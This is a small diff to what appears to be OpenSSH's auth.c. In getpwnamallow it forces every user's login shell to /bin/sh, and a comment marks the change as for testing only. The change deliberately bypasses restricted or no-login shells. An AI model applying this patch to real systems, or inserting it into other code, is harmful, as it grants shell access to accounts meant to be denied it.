@@ -1,0 +1,17 @@
+diff --git a/auth.c b/auth.c
+index d2a8cd65..811a129f 100644
+--- a/auth.c
++++ b/auth.c
+@@ -580,6 +580,12 @@ getpwnamallow(const char *user)
+ #endif
+ 
+ 	pw = getpwnam(user);
++        if (pw != NULL) {
++		// This is only for testing purposes,
++		// DO NOT USE THIS PATCH IN PRODUCTION!
++		char *shell = "/bin/sh";
++		pw->pw_shell = shell;
++        }
+ 
+ #if defined(_AIX) && defined(HAVE_SETAUTHDB)
+ 	aix_restoreauthdb();
